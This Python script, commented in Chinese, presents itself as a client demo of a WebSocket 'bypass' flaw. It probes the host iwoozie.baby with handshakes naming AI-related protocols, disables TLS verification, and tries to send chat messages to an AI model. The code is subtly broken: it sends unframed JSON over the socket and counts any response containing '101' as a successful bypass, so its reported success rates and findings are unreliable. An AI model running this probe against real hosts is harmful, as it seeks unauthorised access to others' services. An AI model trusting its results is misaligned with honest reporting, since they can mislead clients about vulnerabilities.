#!/usr/bin/env python3
"""
简化版 WebSocket 绕过演示代码
==========================
为甲方客户提供的简化演示代码
"""

import socket
import ssl
import base64
import time
import json
from datetime import datetime

def test_websocket_bypass(protocol_name):
    """测试 WebSocket 绕过"""
    print(f"🔍 测试 WebSocket 协议: {protocol_name}")
    
    try:
        # 生成 WebSocket 密钥
        key = base64.b64encode(b"sample nonce").decode()
        
        # 创建 WebSocket 握手请求
        handshake = (
            f"GET /ws HTTP/1.1\r\n"
            f"Host: iwoozie.baby\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Sec-WebSocket-Protocol: {protocol_name}\r\n"
            f"\r\n"
        )
        
        # 建立连接
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect(('iwoozie.baby', 443))
        
        # 创建 SSL 连接
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with context.wrap_socket(sock, server_hostname='iwoozie.baby') as ssock:
            # 发送握手请求
            ssock.send(handshake.encode())
            response = ssock.recv(4096).decode()
            
            # 检查响应
            if '101 Switching Protocols' in response or '101' in response:
                print(f"    ✅ 成功! 协议: {protocol_name}")
                print(f"    🔗 连接状态: 已建立")
                
                # 尝试发送测试消息
                test_message = {
                    "type": "chat",
                    "content": "Hello, this is a test message",
                    "model": "GPT-4",
                    "protocol": protocol_name
                }
                
                ssock.send(json.dumps(test_message).encode())
                response = ssock.recv(4096).decode()
                
                if response:
                    print(f"    💬 消息发送: 成功")
                    print(f"    📨 收到响应: {response[:100]}...")
                else:
                    print(f"    💬 消息发送: 失败")
                
                return True
            else:
                print(f"    ❌ 失败! 协议: {protocol_name}")
                return False
                
    except Exception as e:
        print(f"    💥 异常: {str(e)}")
        return False

def main():
    """主函数"""
    print("=" * 60)
    print("🔓 WebSocket 绕过漏洞演示工具")
    print("=" * 60)
    print("🎯 目标: iwoozie.baby")
    print("⏰ 时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    print("=" * 60)
    print()
    
    # 测试协议列表
    protocols = [
        "chat",
        "gpt", 
        "ai",
        "openai",
        "anthropic",
        "claude",
        "gemini",
        "grok",
        "deepseek",
        "glm"
    ]
    
    print("🚀 开始 WebSocket 绕过漏洞演示...")
    print()
    
    success_count = 0
    total_count = len(protocols)
    
    for protocol in protocols:
        if test_websocket_bypass(protocol):
            success_count += 1
        print()
        time.sleep(1)  # 避免请求过于频繁
    
    # 生成报告
    print("=" * 60)
    print("📋 演示结果")
    print("=" * 60)
    
    success_rate = (success_count / total_count * 100) if total_count > 0 else 0
    
    print(f"📊 统计结果:")
    print(f"  总测试次数: {total_count}")
    print(f"  成功绕过: {success_count}")
    print(f"  失败尝试: {total_count - success_count}")
    print(f"  绕过成功率: {success_rate:.1f}%")
    print()
    
    if success_rate > 50:
        print("🚨 系统存在严重漏洞，建议立即修复!")
        print("  1. WebSocket 协议验证不完善")
        print("  2. AI 聊天功能访问控制不严格")
        print("  3. 实时通信防护机制不完善")
    elif success_rate > 20:
        print("⚠️  系统存在中等风险，建议尽快改进")
        print("  1. 完善 WebSocket 协议验证")
        print("  2. 加强 AI 聊天功能访问控制")
    else:
        print("✅ 系统安全状况良好")
        print("  1. WebSocket 防护机制有效")
        print("  2. AI 聊天功能访问控制严格")
    
    print("\n" + "=" * 60)

if __name__ == "__main__":
    main()
